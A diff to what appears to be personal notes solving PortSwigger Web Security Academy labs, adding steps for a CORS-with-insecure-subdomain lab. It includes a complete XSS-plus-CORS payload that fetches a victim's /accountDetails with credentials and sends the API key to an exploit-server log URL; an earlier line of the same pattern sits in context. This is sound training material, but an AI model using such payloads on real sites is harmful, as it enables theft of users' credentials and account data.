@@ -85,11 +85,19 @@ location='/log?key='+this.responseText;
 
 - store and view, check your api creds get logged, then deliver to victim to steal theirs
 
+### CORS vulnerability with trusted insecure protocols
 
+- Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+- Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
+- Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
+- Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain
+- Observe that the productID parameter is vulnerable to XSS
+- In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID
 
+```
+<script>
+document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
 
-
-
-
-
-
+- click view exploit, check if it works and send to victim
